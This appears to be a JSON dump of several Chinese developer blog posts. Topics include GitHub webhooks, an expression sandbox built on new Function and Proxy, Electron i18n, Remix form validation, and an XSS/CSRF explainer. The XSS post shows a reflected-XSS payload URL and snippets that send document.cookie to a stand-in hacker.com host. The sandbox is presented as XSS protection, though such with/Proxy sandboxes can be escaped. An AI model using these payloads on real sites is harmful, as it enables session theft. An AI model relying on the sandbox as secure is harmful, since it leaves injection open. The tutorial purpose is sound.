创建成功后，腾讯云会提供个公网访问路径，将其配置到知识库的「消息推送」设置中： AirCode腾讯云 serverless 并不是免费的，前三个月有免费额度,之后收费，既然要白嫖就白嫖到底。推荐使用 https://aircode.io/，每月的免费额度如下，绝对够你使用了： 使用也很简单，新建个项目后，添加三个环境变量 填入以下代码： 1234567891011121314151617181920212223// @see https://docs.aircode.io/guide/functions/const aircode = require(&quot;aircode&quot;);const axios = require(&quot;axios&quot;);module.exports = async function (params, context) &#123; const res = await axios(&#123; url: `https://api.github.com/repos/$&#123;process.env.owner&#125;/$&#123;process.env.repo&#125;/dispatches`, method: &quot;post&quot;, headers: &#123; &quot;User-Agent&quot;: &quot;curl/7.52.1&quot;, &quot;Content-Type&quot;: &quot;application/json&quot;, Authorization: `token $&#123;process.env.token&#125;`, Accept: &quot;application/vnd.github.everest-preview+json&quot;, &#125;, data: &#123; event_type: &quot;webhook&quot; &#125;, &#125;); if (res.status) &#123; return &quot;回调请求成功&quot;; &#125; return res;&#125;; 点击 deploy按钮发布后，会得到云函数的公网访问路径，填到语雀的知识库配置中即可。 发布文章现在，在发布和更新文章后，即可触发 Action。 注意事项 不要开启自动发布，否则无法触发 webhook"},{"title":"JS - 字符串函数表达式","path":"/2023/01/29/0c6c2b4b35c0/","content":"最近在做一个需要，需要实现一个字符串形式的“函数表达式”，以双括号”{{…}}”为语法特征。例如： 123&#123;\ttitle：&quot;&#123;&#123;formData.x.y === &#x27;us&#x27; ? &#x27;美元&#x27;:&#x27;人民币&#x27;&#125;&#125;&quot;&#125; 并且函数表达式内置了一些关键词： $self - 代表当前字段实例，用来获取当前字段的值和 schema 配置 $values - 代表整个表单数据 $form - 代表当前 Form 实例，可以用来触发表单校验等操作 $deps - 获取 dependencies 中依赖项的值，和 dependencies 顺序一致 $fetch - 使用封装的 request 方法，发送 http 请求 使用了关键词的表达式如下： 123&#123; select_options: &quot;&#123;&#123;$self.select_options.map(item =&gt; (&#123; ...item, disabled: $deps[0].map(it =&gt; it.bank_card_usage).includes(item.value) &#125;))&#125;&#125;&quot;;&#125; 函数表达式可能由后端下发或者用户输入，因此为防止 XSS 注入，函数表达式的作用域需要限制下。 实现new Function 语法 引用自：深入 JS new Function 语法 « 张鑫旭-鑫空间-鑫生活 实现函数表达式之前，我们先复习下 new Function 语法： 1let func = new Function([arg1, arg2, ...argN], functionBody); 最后一个参数一定是函数体，其余参数都作为传给函数体的参数。例如： 123let sum = new Function(&quot;a&quot;, &quot;b&quot;, &quot;return a + b&quot;);console.log(sum(1, 2)); // 结果是 3 平常进行 JS 或者 Node.js 开发的时候，我们是没有任何理由使用 new Function 构造函数的，因为没必要，直接使用 function 或者 () &#x3D;&gt; {} 箭头函数写法就好了。 那是不是表示 new Function 语法是个鸡肋特性呢？ 不！绝不是！ new Function 语法有个特别厉害的特性，使其成为 JavaScript 这门语言中无可替代的重要角色。。 什么特性呢？ 那就是函数体的数据格式是字符串，这可是个不得了的东西啊！ 解析函数表达式利用 new Function 的语法特性，我们就可以将字符串变成可执行的代码： 12345const compile = (expression: string, scope = &#123;&#125;) =&gt; &#123; return new Function(&quot;$root&quot;, `with($root) &#123; return ($&#123;expression&#125;); &#125;`)( scope );&#125;; compile 函数有两个参数，第一个参数为要执行的字符串表达式，第二个参数为执行时的作用域，将 $self 等内置关键词传入 scope 供函数执行时调用。 compile 实现时使用了 with 关键词，帮助我们简化代码，如果不使用 with 关键词，scope 里所有的元素都需要依次传入 new Function 中： 12345const compile = (expression, scope = &#123;&#125;) =&gt; &#123; const keys = Object.keys(scope); const values = keys.map((key) =&gt; scope[key]); return new Function(...keys, `return ($&#123;expression&#125;);`)(...values);&#125;; 不过，with 在性能和语义方面都有些问题（具体问题见：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/with），至于用不用，自己考虑吧 限制作用域现在字符串得以执行了，接下来需要解决的就是函数的作用域问题了。 由 Function 构造函数创建的函数不会创建当前环境的闭包，它们总是被创建于全局环境，因此在运行时它们只能访问全局变量和自己的局部变量，不能访问它们被 Function 构造函数创建时所在的作用域的变量。 12345678910111213141516171819var x = 10;function createFunction1() &#123; var x = 20; return new Function(&quot;return x;&quot;); // 这里的 x 指向最上面全局作用域内的 x&#125;function createFunction2() &#123; var x = 20; function f() &#123; return x; // 这里的 x 指向上方本地作用域内的 x &#125; return f;&#125;var f1 = createFunction1();console.log(f1()); // 10var f2 = createFunction2();console.log(f2()); // 20 因此，如果仅仅是限制表达式访问创建时所在的作用域的变量，new Function 就足够了，如果还想要限制访问全局作用域，那么就要实现一个沙箱了。 沙箱 引用自：浅析 JavaScript 沙箱机制 什么是沙箱？在计算机安全中，沙箱（Sandbox）是一种用于隔离正在运行程序的安全机制，通常用于执行未经测试或不受信任的程序或代码，它会为待执行的程序创建一个独立的执行环境，内部程序的执行不会影响到外部程序的运行。 常见的沙箱应用场景： 执行 JSONP 请求回来的字符串时或引入不知名第三方 JS 库时，可能需要创造一个沙箱来执行这些代码。 Vue 模板表达式的计算是运行在一个沙盒之中的，在模板字符串中的表达式只能获取部分全局对象，这一点官方文档有提到，详情可参阅源码。 在线代码编辑器，如 CodeSanbox 等在线代码编辑器在执行脚本时都会将程序放置在一个沙箱中，防止程序访问&#x2F;影响主页面。 够用的沙箱实现：Proxy 中的 get 和 set 方法只能拦截已存在于代理对象中的属性，对于代理对象中不存在的属性这两个钩子是无感知的。因此这里我们使用 Proxy.has() 来拦截 with 代码块中的任意变量的访问，并设置一个白名单，在白名单内的变量可以正常走作用域链的访问方式，不在白名单内的变量会继续判断是否存在沙箱自行维护的上下文对象中，存在则正常访问，不存在则直接报错。 1234567891011121314151617181920212223242526272829303132333435363738394041424344const withedCode = (code: string) =&gt; &#123; return new Function(&quot;$root&quot;, `with($root) &#123; return ($&#123;code&#125;); &#125;`);&#125;;// 可访问全局作用域的白名单列表const access_white_list = [&quot;Math&quot;, &quot;Date&quot;];const Sandbox = (code: string, scope = &#123;&#125;) =&gt; &#123; // 执行上下文对象的代理对象 const scopeProxy = new Proxy(scope, &#123; has: (target, prop) =&gt; &#123; // has 可以拦截 with 代码块中任意属性的访问 if (access_white_list.includes(prop)) &#123; // 在可访问的白名单内，可继续向上查找 return target.hasOwnProperty(prop); &#125; if (!target.hasOwnProperty(prop)) &#123; throw new Error(`Invalid expression - $&#123;prop&#125;! You can not do that!`); &#125; return true; &#125;, &#125;); withedCode(code).call(scopeProxy, scopeProxy);&#125;;// 执行上下文对象const scope = &#123; func: (variable) =&gt; &#123; console.log(variable); &#125;, foo: &quot;foo&quot;,&#125;;// 待执行程序const code = ` Math.random() location.href = &#x27;xxx&#x27; func(foo)`;console.log(Sandbox(code, scope)); 最终实现版本12345678910111213141516171819202122232425262728293031323334353637const scope = &#123; $self: &quot;xxxx&quot;,&#125;;const ExpRE = /^\\s*\\&#123;\\&#123;([\\s\\S]*)\\&#125;\\&#125;\\s*$/;const withedCode = (code: string) =&gt; &#123; return new Function(&quot;$root&quot;, `with($root) &#123; return ($&#123;code&#125;); &#125;`);&#125;;// 可访问全局作用域的白名单列表const access_white_list = [&quot;Math&quot;, &quot;Date&quot;];const Sandbox = (source: string, scope = &#123;&#125;) =&gt; &#123; const matched = source.match(ExpRE); if (!matched) return source; const code = matched[1]; // 执行上下文对象的代理对象 const scopeProxy = new Proxy(scope, &#123; has: (target, prop) =&gt; &#123; // has 可以拦截 with 代码块中任意属性的访问 if (access_white_list.includes(prop)) &#123; // 在可访问的白名单内，可继续向上查找 return target.hasOwnProperty(prop); &#125; if (!target.hasOwnProperty(prop)) &#123; throw new Error(`Invalid expression - $&#123;prop&#125;! You can not do that!`); &#125; return true; &#125;, &#125;); withedCode(code).call(scopeProxy, scopeProxy);&#125;;"},{"title":"Electron - 使用 i18next & react-i18next 进行国际化","path":"/2023/01/28/6c1ff1435713/","content":"i18next 是社区中优秀的国际化框架，在 react 中广泛使用，我司的大量产品都使用 i18next 进行国际化，而 react-i18next 是 i18next 的一个扩展，提供了一些 HOC 及 hook 方便我们在 react 中使用 i18next。 由于 electron 是多进程机制，主进程和渲染进程都需要个 i18next 实例，但是多实例带来了一些问题，比如多实例的语言如何同步，文案如何集中管理？ 针对上面的两个问题，经过实践，我给出的解决方案如下： 主进程负责加载用户选择的语言和对应的文案 渲染进程通过进程通信从主进程的实例上获取初始化语言和文案初始化实例 用户在渲染进程切换语言，通过进程通信，主进程的 i18next 实例加载新语言的文案，并返回给渲染进程动态加载到渲染进程的实例中 整个流程大致如下： 主进程用户选择的系统语言保存在 electron-store 中，通过 getConfigStore方法获取上次用户选择的系统语言，默认为中文 123456789101112131415import Store from &quot;electron-store&quot;;export interface StoreState &#123; theme: string; config: NOTES.Config;&#125;export const getConfigStore = &lt;K extends keyof NOTES.Config&gt;(key: K) =&gt; &#123; return getStore&lt;NOTES.Config[K]&gt;(`config.$&#123;key&#125;`);&#125;;export const setConfigStore = (value: Partial&lt;NOTES.Config&gt;) =&gt; &#123; const config = getAllConfigStore(); return setStore(&quot;config&quot;, &#123; ...config, ...value &#125;);&#125;; i18next-fs-backend 是 i18next 的一个扩展，允许 Node.js 从本地文件系统中加载翻译 1234567891011121314151617import i18next from &quot;i18next&quot;;import i18nextBackend from &quot;i18next-fs-backend&quot;;import &#123; getConfigStore &#125; from &quot;./store&quot;;i18next.use(i18nextBackend).init(&#123; lng: getConfigStore(&quot;lang&quot;) || &quot;zh-CN&quot;, fallbackLng: &quot;en-US&quot;, backend: &#123; loadPath: path.join(__dirname, &quot;./i18n/&#123;&#123;lng&#125;&#125;.json&quot;), &#125;, interpolation: &#123; escapeValue: false, // react already safes from xss &#125;,&#125;);export default i18next; i18next 实例初始化后，通过 loadLanguages加载对应语言的文案，getResourceBundle获取语言的文案，通过这两个方法，渲染进程就可以共享主进程的文案，实现文案的集中管理。 12345678910111213141516171819202122232425262728293031import logger from &quot;electron-log&quot;;import i18next, &#123; LngOptions &#125; from &quot;../../utils/i18n&quot;;export const getI18nLanguages = () =&gt; &#123; return LngOptions;&#125;;export const getI18nInitResource = async () =&gt; &#123; const lng = i18next.language; const resource = await getI18nResource(lng); return &#123; lng, resource &#125;;&#125;;export const getI18nResource = async (lng: string) =&gt; &#123; await i18next.loadLanguages(lng).catch((err) =&gt; &#123; logger.error(err); &#125;); return i18next.getResourceBundle(lng, &quot;&quot;);&#125;;export const changeI18nLang = async (lng: string) =&gt; &#123; return new Promise&lt;boolean&gt;((resolve) =&gt; &#123; i18next.changeLanguage(lng, (err) =&gt; &#123; if (err) logger.error(err); resolve(!err); &#125;); &#125;);&#125;; 渲染进程invokeCommand同学 window 上挂载的变量和主进程双向通行 123456export const invokeCommand = &lt;T&gt;(type: string, payload = &#123;&#125;) =&gt; &#123; return window.api.invoke&lt;T&gt;(&quot;fromRenderer&quot;, &#123; type, payload, &#125;);&#125;; 渲染进程通过 invokeCommand 调用主进程的 getI18nInitResource 方法获取初始的语言和文案完成实例的初始化。用户切换语言时，同样通过进程通信获取新语言的文案，通过 i18next.addResourceBundle动态加载到实例中，调用 i18next.changeLanguage完成语言的切换。 1234567891011121314151617181920212223242526272829303132333435import i18next, &#123; ResourceKey &#125; from &quot;i18next&quot;;import &#123; initReactI18next &#125; from &quot;react-i18next&quot;;import &#123; invokeCommand &#125; from &quot;@/commands&quot;;export const initI18next = async () =&gt; &#123; const &#123; lng, resource &#125; = await invokeCommand&lt;&#123; lng: string; resource: ResourceKey; &#125;&gt;(&quot;getI18nInitResource&quot;); return i18next.use(initReactI18next).init(&#123; lng, resources: &#123; [lng]: &#123; translation: resource, &#125;, &#125;, interpolation: &#123; escapeValue: false, &#125;, &#125;);&#125;;export const changeLanguage = async (lng: string) =&gt; &#123; if (!i18next.hasResourceBundle(lng, &quot;translation&quot;)) &#123; // 动态加载语言 const resource = await invokeCommand&lt;ResourceKey&gt;(&quot;getI18nResource&quot;, lng); i18next.addResourceBundle(lng, &quot;translation&quot;, resource); &#125; return i18next.changeLanguage(lng);&#125;;export default i18next; 总结：electron 的多进程机制导致 i18next 不得不初始化出多个实例，但是我们同样可以利用进程通信，让一个实例加载文案，再同步到另一个实例，实现文案的集中管理。","tags":["React","i18next","Electron"],"categories":["React","Electron"]},{"title":"Remix - 表单&接口入参校验","path":"/2022/04/18/51f956ea22d7/","content":"前言Remix 是 React Router 团队开发的基于 React 框架的全栈 Web 框架。既然是基于 React 框架，那么在 React 中能够使用的表单校验方案，同样适用于 Remix。 Remix 中的客户端表单校验可以采用 React 的表单校验方案，但是 Remix 作为一个全栈框架，自然是有服务端接口的，那么其入参校验也是否可以采用 node 后端通用的参数校验方案？ 下面我们就看看在前后端都是怎么校验参数的 React 表单校验框架内置校验用过 React 组件库同学应该都知道，这些组件库内部一般都会内置一个表单校验模块，例如 Ant Design ： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import React from &#x27;react&#x27;;import &#123; Button, Checkbox, Form, Input &#125; from &#x27;antd&#x27;;const onFinish = (values: any) =&gt; &#123; console.log(&#x27;Success:&#x27;, values);&#125;;const onFinishFailed = (errorInfo: any) =&gt; &#123; console.log(&#x27;Failed:&#x27;, errorInfo);&#125;;const App: React.FC = () =&gt; ( &lt;Form name=&quot;basic&quot; labelCol=&#123;&#123; span: 8 &#125;&#125; wrapperCol=&#123;&#123; span: 16 &#125;&#125; style=&#123;&#123; maxWidth: 600 &#125;&#125; initialValues=&#123;&#123; remember: true &#125;&#125; onFinish=&#123;onFinish&#125; onFinishFailed=&#123;onFinishFailed&#125; autoComplete=&quot;off&quot; &gt; &lt;Form.Item label=&quot;Username&quot; name=&quot;username&quot; rules=&#123;[&#123; required: true, message: &#x27;Please input your username!&#x27; &#125;]&#125; &gt; &lt;Input /&gt; &lt;/Form.Item&gt; &lt;Form.Item label=&quot;Password&quot; name=&quot;password&quot; rules=&#123;[&#123; required: true, message: &#x27;Please input your password!&#x27; &#125;]&#125; &gt; &lt;Input.Password /&gt; &lt;/Form.Item&gt; &lt;Form.Item name=&quot;remember&quot; valuePropName=&quot;checked&quot; wrapperCol=&#123;&#123; offset: 8, span: 16 &#125;&#125;&gt; &lt;Checkbox&gt;Remember me&lt;/Checkbox&gt; &lt;/Form.Item&gt; &lt;Form.Item wrapperCol=&#123;&#123; offset: 8, span: 16 &#125;&#125;&gt; &lt;Button type=&quot;primary&quot; htmlType=&quot;submit&quot;&gt; Submit &lt;/Button&gt; &lt;/Form.Item&gt; &lt;/Form&gt;);export default App; 独立校验模块脱离组件库框架后，前端社区里还是有很多可选的校验模块，这里我只介绍两个我使用过并且绝对特别好用的库： react-hook-form从名字中就能看出，这个库主要适用于 React 框架，因此用原生开发时需要校验表单强烈推荐该库，并且其也能很好的融入现有组件库。 1234567891011121314151617181920212223import &#123; useForm &#125; from &quot;react-hook-form&quot;;export default function App() &#123; const &#123; register, handleSubmit, watch, formState: &#123; errors &#125; &#125; = useForm(); const onSubmit = data =&gt; console.log(data); console.log(watch(&quot;example&quot;)); // watch input value by passing the name of it return ( /* &quot;handleSubmit&quot; will validate your inputs before invoking &quot;onSubmit&quot; */ &lt;form onSubmit=&#123;handleSubmit(onSubmit)&#125;&gt; &#123;/* register your input into the hook by invoking the &quot;register&quot; function */&#125; &lt;input defaultValue=&quot;test&quot; &#123;...register(&quot;example&quot;)&#125; /&gt; &#123;/* include validation with required or other standard HTML validation rules */&#125; &lt;input &#123;...register(&quot;exampleRequired&quot;, &#123; required: true &#125;)&#125; /&gt; &#123;/* errors will return when field validation fails */&#125; &#123;errors.exampleRequired &amp;&amp; &lt;span&gt;This field is required&lt;/span&gt;&#125; &lt;input type=&quot;submit&quot; /&gt; &lt;/form&gt; );&#125; Zod 这个库就是个纯粹的字段校验的库了，正是因为纯粹，社区为其开发了各种适配器，可以将 zod 应用到任何需要字段校验的地方，下面看下 zod 如何应用在 React 表单校验： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import &#123; z &#125; from &quot;zod&quot;;import &#123; useZorm &#125; from &quot;react-zorm&quot;;const FormSchema = z.object(&#123; name: z.string().min(1), password: z .string() .min(10) .refine((pw) =&gt; /[0-9]/.test(pw), &quot;Password must contain a number&quot;),&#125;);function Signup() &#123; const zo = useZorm(&quot;signup&quot;, FormSchema, &#123; onValidSubmit(e) &#123; e.preventDefault(); alert(&quot;Form ok! &quot; + JSON.stringify(e.data, null, 2)); &#125;, &#125;); const disabled = zo.validation?.success === false; return ( &lt;form ref=&#123;zo.ref&#125;&gt; Name: &lt;input type=&quot;text&quot; name=&#123;zo.fields.name()&#125; className=&#123;zo.errors.name(&quot;errored&quot;)&#125; /&gt; &#123;zo.errors.name((e) =&gt; ( &lt;ErrorMessage message=&#123;e.message&#125; /&gt; ))&#125; Password: &lt;input type=&quot;password&quot; name=&#123;zo.fields.password()&#125; className=&#123;zo.errors.password(&quot;errored&quot;)&#125; /&gt; &#123;zo.errors.password((e) =&gt; ( &lt;ErrorMessage message=&#123;e.message&#125; /&gt; ))&#125; &lt;button disabled=&#123;disabled&#125; type=&quot;submit&quot;&gt; Signup! &lt;/button&gt; &lt;pre&gt;Validation status: &#123;JSON.stringify(zo.validation, null, 2)&#125;&lt;/pre&gt; &lt;/form&gt; );&#125; 服务端接口入参校验在服务端校验入参本质上就是校验字段，那么先看下其它的 node 服务端框架都是怎么校验参数的： Egg Egg 使用 egg-validate 模块进行参数校验，基本用法如下： 1234567891011121314151617181920212223class XXXController extends app.Controller &#123; // ... async XXX() &#123; const &#123;ctx&#125; = this; ctx.validate(&#123; system : &#123;type: &#x27;string&#x27;, required: false, defValue: &#x27;account&#x27;, desc: &#x27;系统名称&#x27;&#125;, token : &#123;type: &#x27;string&#x27;, required: true, desc: &#x27;token 验证&#x27;&#125;, redirect: &#123;type: &#x27;string&#x27;, required: false, desc: &#x27;登录跳转&#x27;&#125; &#125;); // if (config.throwError === false) if(ctx.paramErrors) &#123; // get error infos from `ctx.paramErrors`; &#125; let params = ctx.params; let &#123;query, body&#125; = ctx.request; // ctx.params = validater.ret.params; // ctx.request.query = validater.ret.query; // ctx.request.body = validater.ret.body; // ... ctx.body = query; &#125; // ...&#125; nestjs nestjs 主要使用第三方的 class-validator 来进行参数校验。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import &#123; Injectable, PipeTransform, ArgumentMetadata, ValidationError, HttpException, HttpStatus &#125; from &#x27;@nestjs/common&#x27;;import &#123; plainToClass &#125; from &#x27;class-transformer&#x27;;import &#123; validate &#125; from &#x27;class-validator&#x27;;/** * 这是一个全局的参数验证管道，基于class-transformer * 如果失败，则会抛出HttpException * 在main.ts的nestApp要将它设为全局的 */@Injectable()export class ValidationPipe implements PipeTransform &#123; async transform(value: any, &#123; metatype &#125;: ArgumentMetadata) &#123; if (!metatype || !this.toValidate(metatype)) &#123; return value; &#125; const object = plainToClass(metatype, value); const errors = await validate(object); const errorList: string[] = []; const errObjList: ValidationError[] = [...errors]; do &#123; const e = errObjList.shift(); if (!e) &#123; break; &#125; if (e.constraints) &#123; for (const item in e.constraints) &#123; errorList.push(e.constraints[item]); &#125; &#125; if (e.children) &#123; errObjList.push(...e.children); &#125; &#125; while (true); if (errorList.length &gt; 0) &#123; throw new HttpException(&#x27;请求参数校验错误:&#x27; + errorList.join(), HttpStatus.INTERNAL_SERVER_ERROR); &#125; return object; &#125; private toValidate(metatype: Function): boolean &#123; const types: Function[] = [String, Boolean, Number, Array, Object]; return !types.includes(metatype); &#125;&#125; 从上面的两个框架可以看出来，对于如何进行参数校验，大家的处理过程都是差不多的，都是先定义一套规则，然后用这套规则去校验字段。 那么在 remix 中校验入参自然也是这个流程，下面的示例中会使用 zod 来校验参数： 12345678910111213141516171819202122import type &#123; ActionArgs &#125; from &quot;@remix-run/node&quot;;import &#123; z &#125; from &quot;zod&quot;;import &#123; parseFormAny, useZorm &#125; from &quot;react-zorm&quot;;const LoginSchema = z.object(&#123; email: z .string(&#123; required_error: &quot;Email is required&quot; &#125;) .email(&#123; message: &quot;Invalid email&quot; &#125;), password: z .string(&#123; required_error: &quot;Password is required&quot; &#125;) .min(8, &#123; message: &quot;Password must be at least 8 characters&quot; &#125;), remember: z.optional(z.boolean()),&#125;);export async function action(&#123; request &#125;: ActionArgs) &#123; const formData = await request.formData(); const result = await LoginSchema.safeParseAsync(parseFormAny(formData)); if (!result.success) &#123; return json(&#123; errors: result.error &#125;, &#123; status: 400 &#125;); &#125;&#125; 前后端校验统一上面分别介绍了如何在前后端校验参数，但是如果是一个前后端分离的项目，那么前后端分开校验并且使用不同的校验方案自然是没有问题的，但是在 remix 这么一个全栈框架里使用两套校验方案，多少显得有些冗余了，而且很容易导致前后端校验不一致的问题。 那么有没有一种方案，可以只写一套校验规则，同时适用于前后端吗？ 自然是可以的，其实上文已经给出了答案，就是使用 zod 来校验参数，下面给出个完整的示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135import React from &quot;react&quot;;import &#123; IconBrandGithub, IconBrandTwitter &#125; from &quot;@tabler/icons-react&quot;;import &#123; Link, Form &#125; from &quot;@remix-run/react&quot;;import type &#123; ActionArgs &#125; from &quot;@remix-run/node&quot;;import &#123; json, redirect &#125; from &quot;@remix-run/node&quot;;import &#123; parseFormAny, useZorm &#125; from &quot;react-zorm&quot;;import &#123; z &#125; from &quot;zod&quot;;import LoginLayout from &quot;~/components/user-layout&quot;;import FormInner from &quot;~/components/form/form-inner&quot;;import Input from &quot;~/components/input&quot;;import Button from &quot;~/components/button&quot;;import Checkbox from &quot;~/components/checkbox&quot;;import &#123; loginUser, setAuthSession &#125; from &quot;~/modules/auth&quot;;import &#123; authCookie &#125; from &quot;~/integrations/supabase&quot;;const LoginSchema = z.object(&#123; email: z .string(&#123; required_error: &quot;Email is required&quot; &#125;) .email(&#123; message: &quot;Invalid email&quot; &#125;), password: z .string(&#123; required_error: &quot;Password is required&quot; &#125;) .min(8, &#123; message: &quot;Password must be at least 8 characters&quot; &#125;), remember: z.optional(z.boolean()),&#125;);export async function action(&#123; request &#125;: ActionArgs) &#123; const formData = await request.formData(); const result = await LoginSchema.safeParseAsync(parseFormAny(formData)); let session = await authCookie.getSession(request.headers.get(&quot;Cookie&quot;)); if (!result.success) &#123; return json(&#123; errors: result.error &#125;, &#123; status: 400 &#125;); &#125; const &#123; accessToken, refreshToken, error &#125; = await loginUser( result.data.email, result.data.password ); if (error || !accessToken || !refreshToken) &#123; return json(&#123; formError: error || &quot;Something went wrong&quot; &#125;, 403); &#125; session = setAuthSession(session, accessToken, refreshToken); return redirect(&quot;/&quot;, &#123; headers: &#123; &quot;Set-Cookie&quot;: await authCookie.commitSession(session), &#125;, &#125;);&#125;const Login: React.FC = () =&gt; &#123; const zo = useZorm(&quot;NewQuestionWizardScreen&quot;, LoginSchema); const renderFooter = () =&gt; ( &lt;&gt; &lt;div className=&quot;hr-text&quot;&gt;or&lt;/div&gt; &lt;div className=&quot;card-body&quot;&gt; &lt;div className=&quot;row&quot;&gt; &lt;div className=&quot;col&quot;&gt; &lt;Button href=&quot;#&quot; icon=&#123;&lt;IconBrandGithub className=&quot;text-github&quot; /&gt;&#125; block &gt; Login with Github &lt;/Button&gt; &lt;/div&gt; &lt;div className=&quot;col&quot;&gt; &lt;Button href=&quot;#&quot; icon=&#123;&lt;IconBrandTwitter className=&quot;text-twitter&quot; /&gt;&#125; block &gt; Login with Twitter &lt;/Button&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/&gt; ); return ( &lt;LoginLayout title=&quot;Login to your account&quot; footer=&#123;renderFooter()&#125; description=&#123; &lt;&gt; Don&#x27;t have account yet? &lt;Link to=&quot;/sign-up&quot;&gt;Sign up&lt;/Link&gt; &lt;/&gt; &#125; &gt; &lt;Form ref=&#123;zo.ref&#125; method=&quot;post&quot; replace&gt; &lt;FormInner label=&quot;Email address&quot; required error=&#123;zo.errors.email()?.message&#125; &gt; &lt;Input name=&#123;zo.fields.email()&#125; type=&quot;email&quot; placeholder=&quot;your@email.com&quot; /&gt; &lt;/FormInner&gt; &lt;FormInner label=&quot;Password&quot; required labelSuffix=&#123;&lt;Link to=&quot;/forgot-password&quot;&gt;I forgot password&lt;/Link&gt;&#125; error=&#123;zo.errors.password()?.message&#125; &gt; &lt;Input name=&#123;zo.fields.password()&#125; type=&quot;password&quot; placeholder=&quot;Your password&quot; /&gt; &lt;/FormInner&gt; &lt;div className=&quot;mb-2&quot;&gt; &lt;Checkbox name=&#123;zo.fields.remember()&#125;&gt; Remember me on this device &lt;/Checkbox&gt; &lt;/div&gt; &lt;div className=&quot;form-footer&quot;&gt; &lt;Button buttonType=&quot;submit&quot; type=&quot;primary&quot; block&gt; Sign in &lt;/Button&gt; &lt;/div&gt; &lt;/Form&gt; &lt;/LoginLayout&gt; );&#125;;export default Login;","tags":["React","Remix"],"categories":["React","Remix"]},{"title":"XSS和CSRF的区别及防御","path":"/2022/03/08/7948600e1d25/","content":"在 Web 安全领域，XSS 和 CSRF 是个老生常谈的都行了，特别是面试的时候，但是还是有很多同学将它们搞混。本文将简单的介绍下它们的区别，以及常见的防御手段。 介绍之前，先上下维基百科： XSS：跨站脚本（Cross-site scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。 CSRF:跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。 XSS用“人话说”，XSS 就是恶意攻击者往 Web 页面里插入恶意 Script 代码，当用户浏览该页之时，嵌入其中 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。 XSS攻击可以分为3类：反射型（非持久型）、存储型（持久型）、基于DOM。 反射型反射型是指xss代码在请求的url中，而后提交到服务器，服务器解析后，XSS代码随着响应内容一起传给客户端进行解析执行。（直接反射显示在页面） 流程图如下： 通过流程图可以很容易知道存储型XSS的常用攻击流程为：攻击者构造带有恶意XSS代码的URL—&gt;别的用户访问这个URL—&gt;恶意代码被服务器解析—&gt;传递给前端渲染实现攻击。 如果你想搞懂一个漏洞，比较好的方法是：你可以自己先制造出这个漏洞（用代码编写），然后再利用它，最后再修复它 pikachu，是个开源的漏洞测试平台，按照 README 启动项目后，跳转到「反射型xss」页面，在输入框中输入「kobe」后，点击 submit，打开控制台，观察后端返回的 html： 可以看到，输入框的内容出现在 html 和链接里，这就给我们带来了可乘之机，如果输入框里输入的是一段 script 脚本呢？ 脚本被插入到 htmlh中，并且被执行。这时将这段链接 http://localhost:8095/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&amp;submit=submit# 发送给用户，诱导用户点击，就完成了一次 XSS 攻击。 现在的脚本只是 alert 用户的 cookie，还停留在恶搞的层面，如果将 cookie 发送到恶意攻击者的服务器上，那就是一起严重的安全事故了。 1&lt;script src=&quot;http://hacker.com/hacker.js&quot;&gt;&lt;/script&gt; 123var img = new Image();img.src = &quot;http://hacker.com/hack.png?q=&quot; + document.cookie;document.body.append(img); 存储型存储型 XSS 会把用户输入的数据 “存储” 在服务器端，当浏览器请求数据时，脚本从服务器上传回并执行。这种 XSS 攻击具有很强的稳定性。 反射型 XSS 每次攻击还需要诱导用户点击诱饵链接，如果用户无动于衷，攻击者也是无可奈何，而存储型 XSS 一旦将恶意脚本入库了，任何访问到这段脚本用户都会中招。 比较常见的一个场景是攻击者在社区或论坛上写下一篇包含恶意 JavaScript 代码的文章或评论，文章或评论发表后，所有访问该文章或评论的用户，都会在他们的浏览器中执行这段恶意的 JavaScript 代码。 流程图如下： 通过流程图可以很容易知道存储型XSS的常用攻击流程为：攻击者前端插入恶意XSS代码—&gt;后端不做处理传入数据库—&gt;别的用户访问页面—&gt;后端从数据库中调用XSS代码—&gt;前端渲染(执行js脚本)恶意代码实现攻击。 这里还是用 pikachu 来实操下，打开「存储型xss」页面，输入框中输入一段 script 脚本： 提交后并刷新页面，这段脚本被注入到 html 中，并执行了"},{"title":"在 React 项目中优雅地使用 Typescript","path":"/2021/04/19/368700e46601/","content":"TypeScript 是 Javascript 的超集，扩展了 JavaScript 的语法，给 JavaScript 带来了静态类型支持，了解如何在 React 项目中优雅地使用 Typescript，能帮助我们写出更优雅的代码。 「优雅」的含义： 减少编写冗余的类型定义、类型标注，充分利用ts的自动类型推断，以及外部提供的类型声明。 类型安全：提供足够的类型信息来避免运行时错误，让错误暴露在开发期。这些类型信息同时能够提供代码补全、跳转到定义等功能。 组件定义函数组件1234567891011121314151617import * as React from &#x27;react&#x27;;// 如果在tsconfig中设置了&quot;allowSyntheticDefaultImports&quot;: true// 你还可以更精练地import react：// import React from &quot;react&quot;;interface IProps &#123; // CSSProperties提供样式声明的类型信息 // 用户传入style的时候就能够获得类型检查和代码补全 style?: React.CSSProperties; // 使用@types/react提供的事件类型定义，这里指定event.target的类型是HTMLButtonElement onClick(event: React.MouseEvent&lt;HTMLButtonElement&gt;): void; // ...&#125;const MyComponent: React.FC&lt;IProps&gt; = (props) =&gt; &#123; const &#123; children, ...restProps &#125; = props; return &lt;div &#123;...restProps&#125;&gt;&#123;children&#125;&lt;/div&gt;;&#125; FC是FunctionComponent的缩写。 IProps无需声明children属性的类型。React.FC会自动为props添加这个属性类型。当然，如果children期望一个render prop，或者期望其他特殊的值，那么你还是要自己给children声明类型，而不是使用默认的React.ReactNode。 props无需做类型标注。 